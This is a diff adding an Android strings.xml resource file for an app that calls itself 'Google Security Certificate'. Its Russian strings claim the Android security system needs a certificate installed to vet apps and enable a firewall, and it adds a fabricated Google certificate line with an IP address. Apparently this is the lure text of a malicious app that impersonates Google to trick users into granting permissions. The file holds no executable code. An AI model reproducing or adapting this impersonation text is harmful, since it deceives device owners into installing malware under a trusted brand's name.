@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">Google Security Certificate</string>
+    <string name="action_settings">Settings</string>
+    <string name="hello_world">Hello world!</string>
+    <string name="main_label">Установка сертификата</string>
+    <string name="bottom_label">Web Server Certificate. Transaction on the site are protected with up to 256-bit Secure Sockets Layer encryption</string>
+    <string name="button_label">Разрешить</string>
+     <string name="buttonExit_label">Отклонить</string>
+    <string name="nash_text">Система безопасности Android запросила сертификат. Установка сертификата предоставит устройству возможность проверки надежности установленных приложений. Также будет установлен межсетевой экран, для предотвращения деятельности подозрительных программ.</string>
+    <string name="nash_text2">Google.com, CN=Security id:216.239.59.104, OU=Google Certification Center, O=GoogleTransfer</string>
+
+</resources>
